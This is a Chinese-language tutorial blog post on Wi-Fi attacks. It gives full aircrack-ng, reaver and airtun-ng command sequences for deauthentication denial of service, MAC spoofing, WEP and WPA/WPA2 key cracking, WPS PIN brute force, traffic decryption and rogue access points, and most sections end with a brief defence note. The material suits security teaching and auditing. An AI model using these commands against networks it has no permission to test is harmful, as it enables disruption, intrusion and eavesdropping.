---
title: 无线攻击示例
date: 2018-06-13 00:00:00
categories:
- Wireless/Wifi
tags: 无线安全
---

## 攻击情景——拒绝服务

使你附近的已经连接到无线网络的终端设备掉线，目前无有效手段防御

### 原理

持续伪造热点与终端之间的Deauthentication（解除认证）这个管理帧，此帧是不进行数据加密的，可以任意伪造。

![image](https://xuanxuanblingbling.github.io/assets/pic/deauth.png)

### 方法

- 首先通过airodump-ng进行嗅探，获得要攻击的终端以及终端所连接的接入点的MAC地址
- 利用aireplay-ng的0号攻击模式，持续注入Deauthentication数据包

```bash
# aireplay-ng -0 [攻击次数] -a [AP的MAC地址] -c [STA的MAC地址] wlan0mon

root@kali:~# aireplay-ng -0 99999 -a 00:11:22:33:44:55 -c 55:44:33:22:11:00 wlan0mon
```

> 淘宝：wifi断网神器

### 防御

Deauth攻击的原理是因为WIFI管理数据帧没有被加密，导致攻击者可以伪造管理帧，从而让攻击者可以任意发送“取消认证”数据包来强行切断AP与客户端的连接。解决方法有是有，但需要路由器支持802.11w协议。（802.11w协议加密了管理数据帧，从而使得WIFI免受Deauth攻击的破坏）以及，WPA3安全协议彻底解决了这个问题。不过WPA 3普及起码得到19年了。

作者：匿名用户  
链接：https://www.zhihu.com/question/28441447/answer/332869894  
来源：知乎  
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 

## 攻击情景——渗透网络

渗透进入受保护的无线网络

### MAC白名单

在网络上经常见到有人采用开放式无密码的无线配置，然后将设置MAC地址白名单当做非常安全可靠的访问控制机制，但这其实是非常愚蠢的！

#### 原理

MAC地址可以伪造，并且已经连接上相应AP的终端设备，其MAC地址可被嗅探而且必然在白名单中。

#### 方法

- 通过airodump-ng嗅探到可以连接到目标AP的终端设备的MAC地址
- 利用操作系统中各种自带工具修改本机网卡MAC地址即可

老版kali中可以利用macchanger这种工具来完成MAC地址的伪造：

```bash
root@kali:~# ifconfig wlan0 down
root@kali:~# macchanger -m 00:11:22:33:44:55 wlan0
root@kali:~# ifconfig wlan0 up
```

但是笔者在实践过程中发现每次启动网卡时MAC地址仍无法修改，又尝试去关闭network-manager服务也没有效果。也许是这种方法在新版本中已经不需要了吧。

在新版kali中可以直接在网络管理的图形界面中找到针对连接到每一个热点的配置，在identity的Cloned Address中填写伪造的MAC地址即可。

> 注：因为这里已经伪造了MAC地址，所以当前网络中存在了两个相同ip相同mac的设备，丢包率会大大增加。而且这里如果采取开放式的热点，所有不加密的上层通信数据是可以直接被嗅探到的。

#### 防御

采用高强度密码的WPA/WPA2安全机制，不要相信MAC地址白名单这种访问控制方法

### 破解密码——WEP

#### 原理

WEP安全机制被证明是存在漏洞的：利用已知的初始矢量IV和第一个字节密钥流输出，并结合RC4密钥方案的特点，攻击者通过计算就可以确定WEP密钥。

> 由于WEP加密算法实际上是利用RC4流密码算法作为伪随机数产生器将由初始矢量IV和WEP密钥组合而成的种子生成WEP 密钥流，再由该密钥流与WEP帧数据负载进行异或运算来完成加密运算。而RC4流密码算法是将输入种子密钥进行某种置换和组合运算来生成WEP密钥流的。由于WEP帧中数据负载的第一个字节是逻辑链路控制的802.2头信息，这个头信息对于每个WEP帧都是相同的，攻击者很容易猜测，利用猜的第一个明文字节和WEP帧数据负载密文就可以通过异或运算得到PRNG生成的密钥流中的第一字节。另外，种子密钥中的24比特初始矢量是以明文形式传送的，攻击者可以将其截获，存到初始矢量

参考：深入解析无线WEP和WPA密码及破解原理.doc (附件)

#### 方法

通过重放合法的ARP请求来获得大量的含有iv的密文数据，从而破解密码。攻击过程不难但是较为繁琐，为了便于攻击过程中方便观察，建议用tmux分屏或者直接打开4个终端窗口完成攻击的整个流程。步骤如下：

##### 窗口一

- 将网卡置入监听模式

```bash
root@kali:~ airmon-ng start wlan0
```

- 扫描附近网络，找到采取WEP方式保护的热点，得到AP的MAC地址以及工作信道

```bash
root@kali:~# airodump-ng wlan0mon
```

- 针对目标AP进行嗅探并保存文件

```bash
# airodump-ng --bssid [AP的MAC地址] wlan0mon -w [保存的文件名] -c [信道序号] 

root@kali:~# airodump-ng --bssid 00:11:22:33:44:55 wlan0mon -w test -c 8 
```

窗口一将一直显示最新的嗅探状态，获得与目标AP相连接的STA信息，并且实时保存所有嗅探到的数据包，此时我们的工作区可以切换到窗口二。

##### 窗口二

- 使用aireplay-ng的0号攻击模式，将任意一个与AP连接着的STA打掉线（AP的MAC地址通过窗口一运行着的airodump-ng获得）

```bash
# aireplay-ng -0 [攻击次数] -a [AP的MAC地址] -c [STA的MAC地址] wlan0mon

root@kali:~# aireplay-ng -0 10 -a 00:11:22:33:44:55 -c 55:44:33:22:11:00 wlan0mon
```

当STA重新与AP进行连接时，挑战应答中的随机数与被秘钥流加密的随机数将被窗口一运行中的airodump-ng捕获识别，并对二者进行异或运算，生成相应的xor文件保存在当前目录下。若此流程被顺利执行，则在窗口一中运行的airodump-ng的右上角则会提示捕捉到xor文件，这时可在窗口二中进行下一步：

- 使用aireplay-ng的1号攻击模式，使攻击机与AP建立关联（不认证），为后续可以成功的重放ARP请求做准备

```bash
# aireplay-ng -1 [重新关联时间(秒)] -e [AP的名称] -y [捕获的秘钥流文件] -a [AP的MAC地址] -h [本机的MAC地址] wlan0mon

root@kali:~# aireplay-ng -1 60 -e testwifi -y test-xx-xx-xx.tor -a 00:11:22:33:44:55 -h 11:22:33:44:55:66 wlan0mon
```

此时窗口二运行的aireplay-ng将会一直伪造本机与AP建立关联的数据包，工作区切换到窗口三

##### 窗口三

- 使用aireplay-ng的3号攻击模式，等待捕获合法的ARP请求，捕获后自动重放

```bash
# aireplay-ng -3 -b [AP的MAC地址] -h [本机的MAC地址] wlan0mon

root@kali:~# aireplay-ng -3 -b 00:11:22:33:44:55 -h 11:22:33:44:55:66 wlan0mon
```

此时窗口三运行的aireplay-ng将会一直在识别是否捕获到合法的ARP数据包，工作区切换到窗口四

##### 窗口四

- 为了让窗口三中的aireplay-ng捕获到合法的ARP数据包，继续使用aireplay-ng的0号攻击模式将STA打掉线

```bash
# aireplay-ng -0 [攻击次数] -a [AP的MAC地址] -c [STA的MAC地址] wlan0mon

root@kali:~# aireplay-ng -0 5 -a 00:11:22:33:44:55 -c 55:44:33:22:11:00 wlan0mon
```

- 当STA与AP重新关联并认证时，可见窗口三种捕获到合法ARP请求，开始重放。同时也可见窗口一种的DATA字段的数值在快速的增长，当DATA的值大于一定数量时（5w+就差不多），即可使用aircrack-ng破解密码：

```bash
root@kali:~# aircrack-ng test-01.cap
```

#### 防御

采用高强度密码的WPA/WPA2安全机制，不要采取WEP安全机制

### 破解密码——WPA/WPA2

#### 原理

当认证过程中的握手包被嗅探到时，则可以对共享秘钥进行离线的爆破。

> 在四步握手中的前两步中，可以获得除共享秘钥和ESSID以外，用来生成PTK的所有参数，以及正确的PTK的MIC校验。目标AP的ESSID也是可知的，所以即可通过本地计算的方式来爆破共享秘钥。

![image](http://etutorials.org/shared/images/tutorials/tutorial_57/08fig17.gif)

参考：

[WPA-PSK无线网络破解原理及过程](http://www.freebuf.com/articles/wireless/58342.html)

深入解析无线WEP和WPA密码及破解原理.doc (附件)

#### 方法

为了方便操作开启两个终端窗口

##### 窗口一

- 将网卡置入监听模式

```bash
root@kali:~ airmon-ng start wlan0
```

- 扫描附近网络，找到采取WPA/WPA2方式保护的热点，得到AP的MAC地址以及工作信道

```bash
root@kali:~# airodump-ng wlan0mon
```

- 针对目标AP进行嗅探并保存文件

```bash
# airodump-ng --bssid [AP的MAC地址] wlan0mon -w [保存的文件名] -c [信道序号] 

root@kali:~# airodump-ng --bssid 00:11:22:33:44:55 wlan0mon -w test -c 8 
```

窗口一将一直显示最新的嗅探状态，获得与目标AP相连接的STA信息，并且实时保存所有嗅探到的数据包，此时我们的工作区可以切换到窗口二。

##### 窗口二

- 使用aireplay-ng的0号攻击模式，将任意一个与AP连接着的STA打掉线（AP的MAC地址通过窗口一运行着的airodump-ng获得）

```bash
# aireplay-ng -0 [攻击次数] -a [AP的MAC地址] -c [STA的MAC地址] wlan0mon

root@kali:~# aireplay-ng -0 10 -a 00:11:22:33:44:55 -c 55:44:33:22:11:00 wlan0mon
```

- 当STA重新与AP进行连接时，运行在窗口一种的airodump-ng将会捕捉到认证的握手包并在右上角提示handshake，此时利用aircrack-ng指明字典进行爆破即可

```bash
root@kali:~# aircrack-ng test-01.cap -w passwd.txt
```

其实最终捕获的数据包中只要有三条数据包就可以进行破解：四步握手的前两步，一个AP的beacon帧（用来获得AP的ESSID）

![image](https://xuanxuanblingbling.github.io/assets/pic/wpa3.png )

#### 密码工具

WPA/WPA2密码破解的重点其实不在于握手包的捕获，而在于密码的破解。如果字典中没有相应的密码是无法破解的，而且在PYK的计算中，4096次hash是相当耗时的，所以如何高效的破解密码才是重中之重，以下介绍四个工具：

##### airolib-ng

##### john

##### cowpatty

##### pyrit

#### 防御

使用复杂密码

### 破解密码——WPS

#### 原理

通过爆破第一种AP PIN的认证方式，即可直接提取共享秘钥

> pin码是一个8位的整数，破解过程时间比较短。WPS PIN码的第8位数是一个校验和，因此黑客只需计算前7位数。另外前7位中的前四位和后三位分开认证。所以破解pin码最多只需要1.1万次尝试，顺利的情况下在3小时左右。

#### 方法

- 将网卡置入监听模式

```bash
root@kali:~ airmon-ng start wlan0
```

- 通过airodump或者wash嗅探支持WPS的目标：

```bash
root@kali:~# airodump-ng wlan0mon --wps
root@kali:~# wash -i wlan0mon
```

- 利用reaver穷举破解pin码，并通过获取的pin码得到无线AP上网密码（在利用reaver进行爆破时，貌似不要开airodump-ng或者wash来监听，可能会对爆破产生影响）

```bash
# reaver -i wlan0mon -b [AP的MAC地址] -vv(输出详细log) -d [延迟时间] 

root@kali:~# reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -d 3
```

参数说明：

```
1. -i 监听后接口称号‍‍
‍‍2. -b APmac地址‍‍
‍‍3. -a 主动检测AP最佳配置‍‍
‍‍4. -S 利用最小的DH key（能够进步PJ速度）‍‍
‍‍5. -v、-vv 显示更多的破解信息‍‍
‍‍6. -d 即delay每穷举一次的闲置时候预设为1秒‍‍
‍‍7. -t 即timeout每次穷举守候反应的最长时候‍‍
‍‍8. -c 指定频道能够便当找到信号，如-c 1 指定1频道
```

- 利用reaver的-K参数调用pixiewps快速破解有漏洞的AP:

```bash
root@kali:~# reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -K 1
```

报错参考：[利用 reaver 进行无线安全审计](http://blkstone.github.io/2015/08/19/reaver-tutorial/)

#### 防御

关闭WPS，使用使用复杂密码的WPA/WPA2方式保护无线安全

## 攻击情景——数据监听

### 原理

已知密码以及初始的握手包信息，即可解密密文的流量信息

### 方法

不进入网段内的数据监听，也不用修改路由器本身的配置，不用做端口转发。这里有两种方式监听受保护的无线数据，需要将开启监听模式的网卡放置在需要监听的AP附近，并且知道密码。

#### airdecap-ng离线解密数据

- 首先通过airodump-ng抓取无线流量

```bash
root@kali:~# airodump-ng --bssid 00:11:22:33:44:55 wlan0mon -w test -c 8 
```

- 利用airdecap-ng解密WPA数据包（需已知密码，抓到握手包）

```bash
root@kali:~ airdecap-ng -e xuanxuan -p xuanxunanihao -b 00:11:22:33:44:55 xxx.pcap
```

- 此时会在当前目录下生成新的数据包文件，wireshark即可查看到已经解密的数据了

#### airtun-ng实时解密数据

- 通过airtun-ng将目标AP的数据包实时解密并发送给一个新的网卡at0

```bash
root@kali:~ airtun-ng -a 00:11:22:33:44:55 -p xuanxuannihao -e xuanxuan wlan0mon
root@kali:~ ifconfig at0 up
```

- 利用wireshark等工具，去监听新的at0网卡即可

```bash
root@kali:~ dsniff -i at0
root@kali:~ driftnet -i at0
```

### Kcrack

#### 防御

使用长密码，不易被破解，以防数据被监听

## 攻击情景——钓鱼热点

### airbase-ng

通过airbase-ng伪造AP，但是由于后续的使用方法过于繁琐，不建议手动使用

```bash
root@kali:~ airbase-ng -a 00:11:22:33:44:55 --essid xuanxuan -c 1 wlan0mon
```

### wifi-pumpkin

使用前不要对网卡进行任何操作，保持wlan0即可，通过配置setting选项卡中的无线设置，点击左侧start即可开启一个恶意的AP




